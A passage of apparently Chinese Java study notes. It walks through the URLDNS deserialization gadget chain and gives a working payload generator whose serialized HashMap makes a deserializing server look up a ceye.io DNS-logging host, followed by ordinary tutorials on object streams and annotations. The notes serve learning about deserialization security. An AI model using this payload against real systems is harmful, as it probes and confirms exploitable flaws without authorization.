class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>       <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>       ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">fields</span> <span class="hljs-operator">=</span> s.readFields();<br><br>       <span class="hljs-comment">// Read loadFactor (ignore threshold)</span><br>       <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> fields.get(<span class="hljs-string">&quot;loadFactor&quot;</span>, <span class="hljs-number">0.75f</span>);<br>       <span class="hljs-keyword">if</span> (lf &lt;= <span class="hljs-number">0</span> || Float.isNaN(lf))<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> + lf);<br><br>       lf = Math.clamp(lf, <span class="hljs-number">0.25f</span>, <span class="hljs-number">4.0f</span>);<br>       HashMap.UnsafeHolder.putLoadFactor(<span class="hljs-built_in">this</span>, lf);<br><br>       reinitialize();<br><br>       s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>       <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> + mappings);<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings == <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-comment">// use defaults</span><br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123;<br>           <span class="hljs-type">double</span> <span class="hljs-variable">dc</span> <span class="hljs-operator">=</span> Math.ceil(mappings / (<span class="hljs-type">double</span>)lf);<br>           <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((dc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                      DEFAULT_INITIAL_CAPACITY :<br>                      (dc &gt;= MAXIMUM_CAPACITY) ?<br>                      MAXIMUM_CAPACITY :<br>                      tableSizeFor((<span class="hljs-type">int</span>)dc));<br>           <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>           threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                        (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>           <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>           <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>           SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);<br>           <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>           Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>           table = tab;<br><br>           <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>           <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>               <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                   <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>               <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                   <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>               putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>           &#125;<br>       &#125;<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>进入刚刚的调用  来到第二下：调key的hashCode方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>       <span class="hljs-type">int</span> h;<br>       <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>下面这一部分就是URL的了</p><p>进入URL的hashCode后 有一个<strong>判断</strong></p><p>如果hashCode不是-1 就会初始化变为-1并返回,如果是初始化的-1的话，才会执行下面的</p><p>就 继续 跳转到URLStreamHandler 的hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>     <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>         <span class="hljs-keyword">return</span> hashCode;<br><br>     hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>     <span class="hljs-keyword">return</span> hashCode;<br> &#125;<br></code></pre></td></tr></table></figure><p>之后调getHostAddress 函数，就能发送dns请求了</p><hr><h4 id="———"><a href="#———" class="headerlink" title="———"></a>———</h4><h4 id="URLDNS真正构造"><a href="#URLDNS真正构造" class="headerlink" title="URLDNS真正构造"></a>URLDNS真正构造</h4><p>按上面来讲是 反序列化时会自动调用入口类的 private readOject 然后进入上述流程完成发送请求的，但有个插曲,在写入url时HashMap的put方法 就已经导致在这时发送请求了</p><p>(因为put为了确保键的唯一，它就会计算key的hash先调用了HashMap的hash 和key的hashCode，hashCode就发生了变化)</p><p><img src="/2025/04/02/%E6%A6%82%E8%BF%B0&&URLDNS/image-20250406172100250-17439312619313.png" alt="image-20250406172100250"></p><p><img src="/2025/04/02/%E6%A6%82%E8%BF%B0&&URLDNS/image-20250406172028200-17439312306462.png" alt="image-20250406172028200"></p><p><em>put 的坏处：</em></p><ul><li><p>我们误以为是序列化时就发送DNS请求</p></li><li><p>put改变了hashCode，所以在<strong>反序列化的时候</strong>hashCode不是-1,直接返回初始化-1不会执行下面的代码，不会发送请求了</p><p><img src="/2025/04/02/%E6%A6%82%E8%BF%B0&&URLDNS/image-20250407001830408-17439563124691.png" alt="image-20250407001830408"></p></li></ul><h4 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路:"></a><em>总结思路:</em></h4><ol><li>入口类hashMap 创建对象</li><li>在put前用反射设置hashCode为非-1,防止put调用key的hashCode发送dns请求</li><li>put方法丢进去url作为key值</li><li>反射设置回来url的hashCode为-1,再序列化对象,这样序列化就不会触发put的那一串发送请求，反序列化的时候就能(调用HashCode的private readObject，调啊调调到URL的hashCode了)发送dns请求了</li></ol><hr><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.test;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(o);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;<br>       <span class="hljs-comment">// Person person = new Person(&quot;xiao&quot;, 18, 01);</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>       <span class="hljs-comment">//这里不想要发起请求，把url对象的hashcode改成不是-1就可以了</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://be5fsm.ceye.io&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcodefield</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">1234</span>);<br>        hashmap.put(url, <span class="hljs-number">1</span>);<span class="hljs-comment">//不改变的话在put的时候就已经调用hash,key的hashCode方法了，已经发送dns请求了</span><br><br>       <span class="hljs-comment">//这里把hashCode改回-1</span><br>       <span class="hljs-comment">//通过反射改变已有对象的属性</span><br>        hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br><br><br><br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="最后总结"><a href="#最后总结" class="headerlink" title="最后总结"></a>最后总结</h4><p><strong>需要两半部分</strong>,A部分作为入口类,反序列化的时候会自动调用A的参数o的f方法(即入口类hashMap,反序列化的时候会自动调用readObject方法,进而执行key的hashCode方法)</p><p>B部分需要有好的方法( 即能发起dns请求的URL类的hashCode方法)</p><p>B类里面的方法可以达到目的但(由于readObject 后面不能继续利用了)不能直接作为入口类</p><p>B类是后半部分的成品,A类是前半部分的成品</p><p><strong>两部分结合(即同名函数替换)</strong>: 条件:B类就  要与  能直接调的A类的方法中的参数类型 是相同类型(相同或是父子类)，再调A中方法传进B类的参数—&gt;相当于调B中的方法</p><p><strong>注意点</strong>：在传入B类参数即（URL）时用到put方法也会触发发送dns请求的那一串，在put前反射修改hashCode值为非-1，put后修改为-1,最后序列化，在反序列化的时候发送请求</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ObjectOutputStream &amp;&amp; ObjectInputStream</title>
    <link href="/2025/04/02/ObjectOutputStream&amp;&amp;ObjectInputStream/"/>
    <url>/2025/04/02/ObjectOutputStream&amp;&amp;ObjectInputStream/</url>
    
    <content type="html"><![CDATA[<p>ObjectOutputStream&amp;&amp;ObjectInputStream</p><p>处理流ObjectOutputStream&amp;&amp;ObjectInputStream</p><span id="more"></span><h3 id="节点流-处理流"><a href="#节点流-处理流" class="headerlink" title="节点流&amp;&amp; 处理流"></a>节点流&amp;&amp; 处理流</h3><ol><li><p>节点流：可以从一个特定的数据源（如：文件）读写数据，如：FileReader,FileWriter</p></li><li><p>处理流： （也叫包装流），是“连接”在已存在的流（节点流或处理流）之上</p><p><img src="/2025/04/02/ObjectOutputStream&&ObjectInputStream/image-20250403111505906-17437501750711.png" alt="image-20250403111505906"></p></li></ol><p>例如：BufferedReader类中有属性Reader,即可以封装一个节点流，该节点流可以是任意的，只要是Reader的子类就行（如上图：可以是文件，数组，管道，字符串…）</p><p>FileReader CharArrayReader   PipedReader  StringReader 都可以传进去    把它称为包装流</p><p><strong>区别与联系</strong></p><ol><li>节点流是底层流&#x2F;低级流，直接根数据源相接</li><li>处理流（包装流）包装节点流，使用了修饰器模式，不会直接与数据源项链</li><li>处理流对节点流进行包装，既可以消除不同节点流的实现差异，也可以提供更方便的方法来完成输入输出</li></ol><h4 id="处理流"><a href="#处理流" class="headerlink" title="处理流"></a>处理流</h4><p>拿BufferedReader来说，类里面有一个属性为Reader类的，构造器里传Reader类的 ，因此可以接受Reader子类的对象，就可以对它进行扩展（重写）</p><hr><h3 id="ObjectOutputStream"><a href="#ObjectOutputStream" class="headerlink" title="ObjectOutputStream"></a>ObjectOutputStream</h3><p>ObjectOutputStream 将 Java 对象的基本数据类型和图形写入 OutputStream。 提供序列化功能</p><p>参数:OutputStream out:字节输出流。</p><ul><li><p>构造方法：</p><p>ObjectOutputStream(OutputStream out） 因为它是一个处理流，所以需要一个节点流对象作为参数。</p></li><li><p>成员方法（无返回值）:</p></li><li><p><strong>void</strong> writeObject(Object obj) <em><strong>将指定的对象写入 ObjectOutputStream</strong></em> (即ObjectOutputStream对象(把它叫做流对象吧)调用writeObject方法（流方法）)</p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath));<br>oos.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>,<span class="hljs-number">10</span>));<br></code></pre></td></tr></table></figure></li><li><p>void writeInt （int …）    void writeChar(char …)    void  writeBoolean(boolean …)    同理</p></li></ul><h3 id="ObjectInputStream"><a href="#ObjectInputStream" class="headerlink" title="ObjectInputStream"></a>ObjectInputStream</h3><p>（对象的反序列化流）的构造方法：</p><ul><li><p>构造方法：</p><p>ObjectInputStream(InputStream in) 创建从指定 InputStream 读取的 ObjectInputStream。<br>参数:InputStream in:字节输入流</p></li><li><p>成员方法:（读什么类型就返回什么类型的）</p><ul><li><p><strong>Object</strong> readObject() <em><strong>从 ObjectInputStream 读取对象。</strong></em> （这时就把对象看作一个大类）</p><p>即ObjectInputStream对象 使用readInt,readBoolean,readChar,reaIdObject方法读取，返回读取Object类</p><p>eg:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath));<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> ois.readObject();<br></code></pre></td></tr></table></figure></li><li><p>int readInt()     boolean readBoolean()        char readChar ()       String readUTF() 同理</p></li></ul></li></ul><p>序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.ObjectOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectOutStream</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        String filePath=<span class="hljs-string">&quot;D:\\aaa.txt&quot;</span>;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(filePath));<br><br>        <span class="hljs-comment">//序列化数据到 aaa.txt文件中</span><br>        oos.writeInt(<span class="hljs-number">100</span>);<span class="hljs-comment">//int---&gt;integer (实现了Serializable)</span><br>        oos.writeBoolean(<span class="hljs-literal">true</span>);<span class="hljs-comment">//boolean---&gt;Boolean(实现了Serializable)</span><br>        oos.writeChar(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-comment">//char---&gt;Character(实现了Serializable)</span><br>        oos.writeDouble(<span class="hljs-number">3.14</span>);<span class="hljs-comment">//double---&gt;Double(实现了Serializable)</span><br>        oos.writeUTF(<span class="hljs-string">&quot;hello&quot;</span>);<span class="hljs-comment">//String</span><br><br>        <span class="hljs-comment">//保存一个Dog对象</span><br>        oos.writeObject(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>,<span class="hljs-number">10</span>));  <span class="hljs-comment">//Dog和它在同一个包下所以可以直接用</span><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>Dog 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.ObjectOutputStream;<br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-comment">//serialVersionUID序列化的版本号，可以提高兼容性</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-built_in">this</span>.age=age;<br>            <span class="hljs-built_in">this</span>.name=name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Dog&#123;&quot;</span> +<br>                    <span class="hljs-string">&quot;age=&quot;</span> + age +<br>                    <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                    <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>        &#125;<br>    &#125;<br><br><br></code></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.InputStream;<br><span class="hljs-keyword">import</span> com.zhang.ObjectOutputStream.Dog; <span class="hljs-comment">//反序列化对象所属的类的路径必须与序列化时调用类的路径一致</span><br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectInStream</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//指定要反序列化的文件</span><br>        String filePath=<span class="hljs-string">&quot;D:\\aaa.txt&quot;</span>;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath));<br><br>        <span class="hljs-comment">//读取的顺序（反序列化的顺序）一定要和保存顺序（序列化顺序）一致，否则会报异常</span><br>        System.out.println(ois.readInt());<br>        System.out.println(ois.readBoolean());<br>        System.out.println(ois.readChar());<br>        System.out.println(ois.readDouble());<br>        System.out.println(ois.readUTF());<br>        <span class="hljs-comment">//dog 的编译类型是Object，dog 的运行类型是Dog</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;运行类型&quot;</span>+dog.getClass());<br>        System.out.println(dog);<br>        <span class="hljs-comment">//特别重要的细节</span><br>        <span class="hljs-comment">//1.注意此时dog是Object类型的哦！Dog类中的方法只有Dog子类中存在，父类Object对象 dog 是不能调用子类中独有的对象的，需要向下强转</span><br>        <span class="hljs-comment">// dog.getName();！！不可以！！</span><br>        <span class="hljs-comment">//2.！！这里Dog的定义需放到同一个包下或可以引用的地方才能用）   总之序列化和反序列化引用的类的路径必须相同</span><br>       Dog dog2= (Dog)dog;<br>        System.out.println(dog2.getName());<br>        ois.close();<br><br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="小总结："><a href="#小总结：" class="headerlink" title="小总结："></a><em><strong>小总结：</strong></em></h4><ul><li>创建ObjectInputStream （处理流）对象oos  </li><li>处理流对象oos调用读取对象的方法readObject() 返回Object类型的对象dog</li><li>要调用序列化类的方法，需要向下强转为该类(Object—&gt;Dog)再调用</li></ul><hr><ol><li>读写顺序要一致</li><li>要求序列化或反序列化的对象，要实现Serializable</li><li>序列化的类中建议添加SerialVersionUID,为了提高版本的兼容性</li><li>序列化对象时，默认将里面的所有属性都进行序列化，<strong>但是除了static或transient（短暂的）修饰的成员</strong>它们不会被序列化</li><li>序列化对象时，要求里面的属性类型也需要实现序列化接口，像int 之类的也是间接实现序列化接口，自定义一种类的时候要注意实现序列化接口</li><li>序列化具备可继承性，如果某类已经实现了序列化，则它的所有子类也已经默认实现了序列化</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>注解&amp;&amp;反射&amp;&amp;类加载</title>
    <link href="/2025/03/26/%E6%B3%A8%E8%A7%A3-%E7%B1%BB%E5%8A%A0%E8%BD%BD-%E5%8F%8D%E5%B0%84/"/>
    <url>/2025/03/26/%E6%B3%A8%E8%A7%A3-%E7%B1%BB%E5%8A%A0%E8%BD%BD-%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<p> 基础</p><!---more--><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><p>Annotation:</p><ul><li><p>不是程序本身，可以对程序作出解释，可以被其他程序（比如：编译器）读取</p></li><li><p>格式：”@注释名” 在代码中存在，还可以添加一些参数值，eg:@SuppressWarnings(value&#x3D;”unchecked”)</p></li><li><p>可以附加在package,class,method,field 等上面。相当于给他们添加了额外的辅助信息，我们可以通过反射机制编程实现对这些元数据的访问</p></li></ul><h4 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h4><ul><li>@Override:定义在java.lang.Override 中  重写方法</li><li>@Deprecated: 定义在 java.lang.Deprecated 中 ，表示不鼓励程序员使用这样的元素</li><li>@SuppressWarnings: 定义在java.labg.SuppressWarnings 中，用来抑制编译时的警告信息，他需要添加一个参数才能使用，这些参数都是定义好的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.zhang.annotation;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test01</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Object</span> &#123;<br><br>    <span class="hljs-comment">//@Override 这就是 重写 的注解</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.toString();<br>    &#125;<br><br>    <span class="hljs-meta">@Deprecated</span> <span class="hljs-comment">// @Deprecated 表示不推荐程序员使用，</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Deprecated&quot;</span>);<br><br>    